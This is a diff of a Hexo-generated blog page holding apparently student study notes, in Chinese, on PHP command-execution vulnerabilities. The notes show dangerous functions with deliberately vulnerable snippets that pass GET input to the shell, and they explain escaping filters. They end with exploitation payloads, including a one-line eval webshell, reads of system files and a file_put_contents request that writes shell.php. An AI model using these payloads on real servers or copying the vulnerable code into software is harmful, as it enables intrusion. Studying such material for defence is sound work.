@@ -6,15 +6,15 @@
   
   <title>PHP命令执行漏洞 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="PHP命令执行漏洞1.什么是命令执行2.命令执行的思路准备3.常用的危险函数与作用4.常见的过滤函数与作用    *一，命令执行漏洞  直接在web应用中执行系统命令，从而获取敏感信息或者拿下shell权限。 二，思路与准备 用户能够控制函数输入 存在可执行命令的危险函数 火狐以及HackBar的插件  三，常用的危险函数 [system()和passthru()]  [exec()]  [she">
+  <meta name="description" content="PHP命令执行漏洞1.什么是命令执行2.命令执行的思路准备3.常用的危险函数与作用4.常见的过滤函数与作用5.远程命令执行函数的利用    *一，命令执行漏洞  直接在web应用中执行系统命令，从而获取敏感信息或者拿下shell权限。 二，思路与准备 用户能够控制函数输入 存在可执行命令的危险函数 火狐以及HackBar的插件  三，常用的危险函数1.system()(PHP 4, PHP 5,">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PHP命令执行漏洞">
 <meta property="og:url" content="http://example.com/2023/02/05/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="PHP命令执行漏洞1.什么是命令执行2.命令执行的思路准备3.常用的危险函数与作用4.常见的过滤函数与作用    *一，命令执行漏洞  直接在web应用中执行系统命令，从而获取敏感信息或者拿下shell权限。 二，思路与准备 用户能够控制函数输入 存在可执行命令的危险函数 火狐以及HackBar的插件  三，常用的危险函数 [system()和passthru()]  [exec()]  [she">
+<meta property="og:description" content="PHP命令执行漏洞1.什么是命令执行2.命令执行的思路准备3.常用的危险函数与作用4.常见的过滤函数与作用5.远程命令执行函数的利用    *一，命令执行漏洞  直接在web应用中执行系统命令，从而获取敏感信息或者拿下shell权限。 二，思路与准备 用户能够控制函数输入 存在可执行命令的危险函数 火狐以及HackBar的插件  三，常用的危险函数1.system()(PHP 4, PHP 5,">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2023-02-04T16:12:02.000Z">
-<meta property="article:modified_time" content="2023-02-04T16:48:38.652Z">
+<meta property="article:modified_time" content="2023-02-05T14:58:14.362Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -95,7 +95,7 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="PHP命令执行漏洞"><a href="#PHP命令执行漏洞" class="headerlink" title="PHP命令执行漏洞"></a>PHP命令执行漏洞</h1><h4 id="1-什么是命令执行"><a href="#1-什么是命令执行" class="headerlink" title="1.什么是命令执行"></a>1.什么是命令执行</h4><h4 id="2-命令执行的思路准备"><a href="#2-命令执行的思路准备" class="headerlink" title="2.命令执行的思路准备"></a>2.命令执行的思路准备</h4><h4 id="3-常用的危险函数与作用"><a href="#3-常用的危险函数与作用" class="headerlink" title="3.常用的危险函数与作用"></a>3.常用的危险函数与作用</h4><h4 id="4-常见的过滤函数与作用"><a href="#4-常见的过滤函数与作用" class="headerlink" title="4.常见的过滤函数与作用"></a>4.常见的过滤函数与作用</h4><ul>
+        <h1 id="PHP命令执行漏洞"><a href="#PHP命令执行漏洞" class="headerlink" title="PHP命令执行漏洞"></a>PHP命令执行漏洞</h1><h4 id="1-什么是命令执行"><a href="#1-什么是命令执行" class="headerlink" title="1.什么是命令执行"></a>1.什么是命令执行</h4><h4 id="2-命令执行的思路准备"><a href="#2-命令执行的思路准备" class="headerlink" title="2.命令执行的思路准备"></a>2.命令执行的思路准备</h4><h4 id="3-常用的危险函数与作用"><a href="#3-常用的危险函数与作用" class="headerlink" title="3.常用的危险函数与作用"></a>3.常用的危险函数与作用</h4><h4 id="4-常见的过滤函数与作用"><a href="#4-常见的过滤函数与作用" class="headerlink" title="4.常见的过滤函数与作用"></a>4.常见的过滤函数与作用</h4><h4 id="5-远程命令执行函数的利用"><a href="#5-远程命令执行函数的利用" class="headerlink" title="5.远程命令执行函数的利用"></a>5.远程命令执行函数的利用</h4><ul>
 <li></li>
 <li></li>
 </ul>
@@ -105,15 +105,58 @@
 <li>存在可执行命令的危险函数</li>
 <li>火狐以及HackBar的插件</li>
 </ol>
-<h5 id="三，常用的危险函数"><a href="#三，常用的危险函数" class="headerlink" title="三，常用的危险函数"></a>三，常用的危险函数</h5><ul>
-<li><p>[system()和passthru()]</p>
-</li>
-<li><p>[exec()]</p>
-</li>
-<li><p>[shell_exec()]</p>
-</li>
-</ul>
-<p>​                       </p>
+<h5 id="三，常用的危险函数"><a href="#三，常用的危险函数" class="headerlink" title="三，常用的危险函数"></a>三，常用的危险函数</h5><p><strong>1.system()</strong><br>(PHP 4, PHP 5, PHP 7, PHP 8)</p>
+<p>system — 执行外部程序，并且显示输出，有回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;id&#x27;];</span><br><span class="line">system($a);</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><strong>passthru()</strong><br>(PHP 4, PHP 5, PHP 7, PHP 8)</li>
+</ol>
+<p>passthru — 执行外部程序并且显示原始输出  有回显</p>
+<p>跟system()类似</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;id&#x27;];</span><br><span class="line">passthru($a);</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.exec() &#x2F; shell_exec()</strong><br>(PHP 4, PHP 5, PHP 7, PHP 8)</p>
+<p>exec — 执行一个外部程序</p>
+<p>exec()跟shell_exec()都是无回显的，需要添加echo  输出</p>
+<p>exec只返回最后一行内容 ，shell_exec()返回完整内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;id&#x27;];</span><br><span class="line">echo shell_exec($a);</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><strong>&#96;(反引号)</strong><br>返回多行内容  无回显，需要使用 echo 输出结果</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;id&#x27;];</span><br><span class="line">echo `$a`;</span><br></pre></td></tr></table></figure>
+
+<p>在php中&#96;是一个执行运算符，会将他当作shell命令执行</p>
+<p><strong>5.ob_star()</strong></p>
+<p>ob_start — 打开输出控制缓冲</p>
+<p>ob_star 函数只能接受字符串参数，该函数有返回值，当请求结束后被调用，也可以手动 ob_flush(),ob_clean()或ob_end_flush冲刷（送出）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start(&quot;system&quot;);</span><br><span class="line">echo &quot;whoami&quot;;</span><br><span class="line">6.popen()</span><br><span class="line">&lt;?php</span><br><span class="line">$command=$_GET[&#x27;id&#x27;];</span><br><span class="line">$handle = popen($command, &quot;r&quot;);</span><br><span class="line">if (is_resource($handle))&#123;</span><br><span class="line">    while (!feof($handle)) &#123;</span><br><span class="line">        echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">        echo fread($handle, 1024);</span><br><span class="line">        echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">pclose($handle);</span><br></pre></td></tr></table></figure>
+
+<p><strong>7.proc_open</strong><br>执行一个命令，并且打开 用来输入输出文件的指针</p>
+<h5 id="四，过滤函数"><a href="#四，过滤函数" class="headerlink" title="四，过滤函数"></a>四，过滤函数</h5><p>escapeshellcmd()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=&quot;GBK&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$cmd = escapeshellcmd($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">echo &quot;&lt;pre &gt;&quot;;</span><br><span class="line">echo $cmd;</span><br><span class="line">//echo exec($cmd);</span><br><span class="line">shell_exec($cmd);</span><br><span class="line"></span><br><span class="line">//escapeshellarg();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>它过滤了一些特殊字符，以至于命令无法执行：</p>
+<p>![](D:\My Blog\source_posts\PHP命令执行漏洞.assets\2020112714481253.png)</p>
+<p>escapeshellarg()</p>
+<p>这个函数是将参数转化为字符串，也就是将我们的命令转化为字符串，起到一个保护作用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=&quot;GBK&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$cmd = escapeshellarg($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">echo &quot;&lt;pre &gt;&quot;;</span><br><span class="line">echo $cmd.&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">//echo exec($cmd);</span><br><span class="line">echo shell_exec($cmd);</span><br><span class="line"></span><br><span class="line">//escapeshellarg();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>![在这里插入图片描述](D:\My Blog\source_posts\PHP命令执行漏洞.assets\20201127145319201.png)</p>
+<h4 id="命令执行漏洞的利用方式"><a href="#命令执行漏洞的利用方式" class="headerlink" title="命令执行漏洞的利用方式"></a>命令执行漏洞的利用方式</h4><p>查看文件：?a&#x3D;type +文件路径</p>
+<p>查看当前绝对地址：?a&#x3D;cd</p>
+<p>写shell:?a&#x3D;echo”<?php.phpinfo();?>D-</p>
+<h4 id="远程命令函数的利用"><a href="#远程命令函数的利用" class="headerlink" title="远程命令函数的利用"></a>远程命令函数的利用</h4><p>&gt;?a&#x3D;@eval($_POST[666]);</p>
+<p>一句话木马</p>
+<p>&gt;?a&#x3D;print(<strong>FILE</strong>);</p>
+<p>获取当前绝对路径</p>
+<p>&gt;?a&#x3D;var_dump(file_get_contents(‘c:\windows\system32\drivers\etc\hosts’));</p>
+<p>读取文件</p>
+<p>&gt;?a&#x3D;var_dump(file_put_contents($_POST[1],$_POST[2]));</p>
+<p>1&#x3D;shell.php&amp;2&#x3D;<?php phpinfo()?></p>
+<p>写shell</p>
 
       
     </div>
@@ -127,6 +170,15 @@
   
     
 <nav id="article-nav">
+  
+    <a href="/2023/02/05/crc%E6%A0%A1%E9%AA%8C%E4%B8%8E%E5%8E%8B%E7%BC%A9%E5%8C%85/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          crc校验与压缩包
+        
+      </div>
+    </a>
   
   
     <a href="/2023/01/27/%E7%AC%AC%E4%B8%80%E6%AC%A1misc%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0/" id="article-nav-older" class="article-nav-link-wrap">
@@ -169,23 +221,23 @@
       <ul>
         
           <li>
+            <a href="/2023/02/05/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">一句话木马与文件上传</a>
+          </li>
+        
+          <li>
+            <a href="/2023/02/05/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/">图片隐写</a>
+          </li>
+        
+          <li>
+            <a href="/2023/02/05/crc%E6%A0%A1%E9%AA%8C%E4%B8%8E%E5%8E%8B%E7%BC%A9%E5%8C%85/">crc校验与压缩包</a>
+          </li>
+        
+          <li>
             <a href="/2023/02/05/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">PHP命令执行漏洞</a>
           </li>
         
           <li>
             <a href="/2023/01/27/%E7%AC%AC%E4%B8%80%E6%AC%A1misc%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2023/01/27/%E7%AC%AC%E4%BA%8C%E5%91%A8web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/">第二周web学习笔记</a>
-          </li>
-        
-          <li>
-            <a href="/2023/01/27/php%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2023/01/27/js%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0/">(no title)</a>
           </li>
         
       </ul>
